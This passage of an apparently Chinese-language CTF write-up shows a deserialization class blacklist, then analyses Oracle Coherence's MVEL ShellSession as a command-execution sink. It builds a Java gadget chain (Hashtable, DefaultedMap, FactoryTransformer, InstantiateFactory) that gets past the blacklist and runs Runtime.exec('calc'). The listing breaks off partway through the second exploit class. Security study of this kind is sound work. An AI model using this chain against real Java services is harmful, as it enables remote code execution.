</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="nt">&#34;doSerialHook&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nt">&#34;serialClassName&#34;</span><span class="p">:</span> <span class="s2">&#34;org/apache/shiro/io/ClassResolvingObjectInputStream&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="nt">&#34;dangerClasses&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      <span class="s2">&#34;org.springframework.transaction.support.AbstractPlatformTransactionManager&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      <span class="s2">&#34;java.rmi.server.UnicastRemoteObject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">      <span class="s2">&#34;java.rmi.server.RemoteObjectInvocationHandler&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      <span class="s2">&#34;com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="s2">&#34;java.rmi.server.RemoteObject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">      <span class="s2">&#34;com.tangosol.coherence.rest.util.extractor.MvelExtractor&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">      <span class="s2">&#34;java.lang.Runtime&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">      <span class="s2">&#34;oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="s2">&#34;org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">      <span class="s2">&#34;org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">      <span class="s2">&#34;org.apache.commons.fileupload.disk.DiskFileItem&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="s2">&#34;oracle.jdbc.pool.OraclePooledConnection&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">      <span class="s2">&#34;com.tangosol.util.extractor.ReflectionExtractor&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">      <span class="s2">&#34;com.tangosol.internal.util.SimpleBinaryEntry&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">      <span class="s2">&#34;com.tangosol.coherence.component.util.daemon.queueProcessor.service.grid.partitionedService.PartitionedCache$Storage$BinaryEntry&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">      <span class="s2">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">      <span class="s2">&#34;org.eclipse.persistence.internal.indirection.ProxyIndirectionHandler&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">      <span class="s2">&#34;bsh.XThis&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">      <span class="s2">&#34;bsh.Interpreter&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">      <span class="s2">&#34;com.mchange.v2.c3p0.PoolBackedDataSource&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">      <span class="s2">&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">      <span class="s2">&#34;org.apache.commons.beanutils.BeanComparator&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">      <span class="s2">&#34;java.lang.reflect.Proxy&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">      <span class="s2">&#34;clojure.lang.PersistentArrayMap&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">      <span class="s2">&#34;org.apache.commons.io.output.DeferredFileOutputStream&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">      <span class="s2">&#34;org.apache.commons.io.output.ThresholdingOutputStream&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">      <span class="s2">&#34;org.apache.wicket.util.upload.DiskFileItem&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">      <span class="s2">&#34;org.apache.wicket.util.io.DeferredFileOutputStream&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">      <span class="s2">&#34;org.apache.wicket.util.io.ThresholdingOutputStream&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">      <span class="s2">&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">      <span class="s2">&#34;com.sun.syndication.feed.impl.ObjectBean&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">      <span class="s2">&#34;org.springframework.beans.factory.ObjectFactory&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">      <span class="s2">&#34;org.springframework.aop.framework.AdvisedSupport&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">      <span class="s2">&#34;org.springframework.aop.target.SingletonTargetSource&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">      <span class="s2">&#34;com.vaadin.data.util.NestedMethodProperty&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">      <span class="s2">&#34;com.vaadin.data.util.PropertysetItem&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">      <span class="s2">&#34;javax.management.BadAttributeValueExpException&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">      <span class="s2">&#34;org.apache.myfaces.context.servlet.FacesContextImpl&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">      <span class="s2">&#34;org.apache.myfaces.context.servlet.FacesContextImplBase&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">      <span class="s2">&#34;org.apache.commons.collections.functors.InvokerTransformer&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">      <span class="s2">&#34;org.apache.commons.collections.functors.InstantiateTransformer&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">      <span class="s2">&#34;org.apache.commons.collections4.functors.InvokerTransformer&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">      <span class="s2">&#34;org.apache.commons.collections4.functors.InstantiateTransformer&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">      <span class="s2">&#34;java.lang.ProcessBuilder&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">      <span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">      <span class="s2">&#34;java.security.SignedObject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">      <span class="s2">&#34;com.sun.jndi.ldap.LdapAttribute&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">      <span class="s2">&#34;javax.naming.InitialContext&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">      <span class="s2">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">      <span class="s2">&#34;org.springframework.aop.aspectj&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">      <span class="s2">&#34;org.apache.xbean.naming.context&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">      <span class="s2">&#34;JSONArray&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">      <span class="s2">&#34;POJONode&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">      <span class="s2">&#34;ToStringBean&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">      <span class="s2">&#34;EqualsBean&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">60</span><span class="cl">      <span class="s2">&#34;ProxyLazyValue&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">      <span class="s2">&#34;SwingLazyValue&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">62</span><span class="cl">      <span class="s2">&#34;UIDefaults&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">      <span class="s2">&#34;XString&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">      <span class="s2">&#34;org.springframework.cache.interceptor.BeanFactoryCacheOperationSourceAdvisor&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl">      <span class="s2">&#34;org.springframework.aop.aspectj.AspectInstanceFactory&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">      <span class="s2">&#34;org.slf4j&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">      <span class="s2">&#34;groovy&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">68</span><span class="cl">      <span class="s2">&#34;sun.print.UnixPrintService&#34;</span>
</span></span><span class="line"><span class="ln">69</span><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="ln">70</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><h3 id="sink-shellsession">Sink: ShellSession<a hidden class="anchor" aria-hidden="true" href="#sink-shellsession">#</a></h3>
<p><code>ShellSession</code> 的主要作用是<strong>提供一个命令行环境（类似于 Bash 或 Windows 的 cmd），让用户可以输入并执行 MVEL 表达式以及预定义的一些内部命令</strong>，比如：ls、help之类的</p>
<p><img alt="image-20251202000037013" loading="lazy" src="../assets/image-20251202000037013.png"></p>
<p><img alt="image-20251202000112390" loading="lazy" src="../assets/image-20251202000112390.png"></p>
<p>我们来看ShellSession的单参数String的构造方法</p>
<p><img alt="image-20251201235734821" loading="lazy" src="../assets/image-20251201235734821.png"></p>
<p>这里会将参数传入exec方法，我们跟进</p>
<p><img alt="image-20251202000247308" loading="lazy" src="../assets/image-20251202000247308.png"></p>
<p>这里就是将命令按行分割后写入缓冲区，接着调用_exec执行，跟进</p>
<p><img alt="image-20251202000805200" loading="lazy" src="../assets/image-20251202000805200.png"></p>
<p>这里会将命令进行分割，判断第一个 token ，也就是inTokens[0]， 是否是一个预定义的内部命令。如果是内部命令，它会调用该命令对应的 <code>execute</code> 方法来执行，并传递后续的 tokens 作为参数，如果不是则会进入到else，并尝试作为MVEL 表达式来执行</p>
<p><img alt="image-20251202001321314" loading="lazy" src="../assets/image-20251202001321314.png"></p>
<p><img alt="image-20251202001827798" loading="lazy" src="../assets/image-20251202001827798.png"></p>
<p>当执行MVEL表达式失败时（例如，对于像 <code>ls -l</code> 这样的非法表达式），_exec() 方法并不会立即报错，而是会启动一个智能的回退机制：如果 <code>$COMMAND_PASSTHRU</code> 环境变量被设为 <code>true</code>，它会转而将该命令视为一个操作系统的原生命令，并遍历 <code>$PATH</code> 环境变量中的所有目录来搜索对应的可执行文件，一旦找到，便会通过 <code>Runtime.getRuntime().exec()</code> 在操作系统层面启动该程序。既然都能执行mvel表达式了，感觉意义不大。可以直接利用mvel表达式命令执行。</p>
<pre tabindex="0"><code>ShellSession help = new ShellSession(&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;);
</code></pre><p><img alt="image-20251202002053046" loading="lazy" src="../assets/image-20251202002053046.png"></p>
<p>这道题我们用ShellSession作为Sink点</p>
<h3 id="source-hashtable">Source: Hashtable<a hidden class="anchor" aria-hidden="true" href="#source-hashtable">#</a></h3>
<p><img alt="image-20251202002444219" loading="lazy" src="../assets/image-20251202002444219.png"></p>
<p>可以看到CC7的Source Hashtable没有被waf，而且Defaultedmap也没有办，基本上可以确定cc7前半条链子都是可用的，如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.tangosol.coherence.mvel2.sh.ShellSession</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.DefaultedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LinkedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EXP</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w"></span><span class="c1">//        new ShellSession(&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">        </span><span class="n">decoratemap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">        </span><span class="n">decoratemap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk2&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ObjectHashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">.</span><span class="na">hashCode</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">.</span><span class="na">hashCode</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">ObjectHashtable</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serializeBase64</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">byteArrayOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">objectOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="w">        </span><span class="n">SecurityObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>实现任意transformer方法调用</p>
<h3 id="中间链子">中间链子<a hidden class="anchor" aria-hidden="true" href="#中间链子">#</a></h3>
<p>org.apache.commons.collections4.functors.InstantiateFactory#create</p>
<p><img alt="image-20251202093252482" loading="lazy" src="../assets/image-20251202093252482.png"></p>
<p>InstantiateFactory可以调用任意构造方法，而FactoryTransformer的transform方法可以调用Factory类型的create方法</p>
<p><img alt="image-20251202094937722" loading="lazy" src="../assets/image-20251202094937722.png"></p>
<p>所以链子如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.tangosol.coherence.mvel2.sh.ShellSession</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.FactoryTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InstantiateFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.DefaultedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LinkedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EXP</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w"></span><span class="c1">//        new ShellSession(&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">        </span><span class="n">FactoryTransformer</span><span class="w"> </span><span class="n">factoryTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FactoryTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InstantiateFactory</span><span class="p">(</span><span class="n">ShellSession</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;</span><span class="p">}));</span><span class="w">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
